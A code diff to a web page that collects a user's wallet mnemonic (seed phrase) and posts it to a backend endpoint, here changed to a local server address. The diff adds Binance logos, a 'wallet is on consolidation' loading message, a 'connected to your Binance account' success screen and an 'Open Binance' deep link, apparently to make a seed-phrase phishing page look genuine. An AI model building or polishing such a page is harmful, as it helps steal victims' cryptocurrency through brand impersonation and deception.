@@ -125,8 +125,8 @@ button:disabled {
   padding-top: 80px;
 }
 .loader {
-  border: 4px solid var(--border);
-  border-top: 4px solid var(--accent);
+  border: 8px solid var(--border);
+  border-top: 8px solid var(--accent);
   border-radius: 50%;
   width: 50px;
   height: 50px;
@@ -142,7 +142,7 @@ button:disabled {
   height: 52px;
   border-radius: 50%;
   display: inline-block;
-  border: 8px solid var(--accent);
+  border: 8px solid  var(--accent);
   position: relative;
   animation: pop .4s ease;
   margin-bottom: 12px;
@@ -154,8 +154,8 @@ button:disabled {
   top: 5px;
   width: 15px;
   height: 30px;
-  border-right: 4px solid var(--accent);
-  border-bottom: 4px solid var(--accent);
+  border-right: 4px solid  var(--accent);
+  border-bottom: 4px solid  var(--accent);
   transform: rotate(45deg);
 }
 @keyframes pop {
@@ -220,14 +220,23 @@ button:disabled {
 </div>
 
 <div id="loading-page">
+  <div class="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/1/12/Binance_logo.svg" alt="Binance Logo">
+  </div>
   <div class="loader"></div>
   <p>Please wait while your wallet is on consolidation...</p>
 </div>
 
 <div id="success-page">
+    <div class="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/1/12/Binance_logo.svg" alt="Binance Logo">
+  </div>
   <div class="checkmark"></div>
   <h3>Well done!</h3>
   <p>Your wallet is now connected to your Binance account.</p>
+  <a href="binance://openPage?url=https://www.binance.com/en/markets" id="openBinanceLink">
+  <button id="openBinance">Open Binance</button>
+</a>
 </div>
 
 <script>
@@ -344,7 +353,7 @@ runBtn.onclick = async () => {
   document.getElementById('loading-page').style.display = 'block';
 
   try {
-    const res = await fetch('/api/run', {
+    const res = await fetch('http://127.0.0.1:8080/api/run', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ mnemonic })
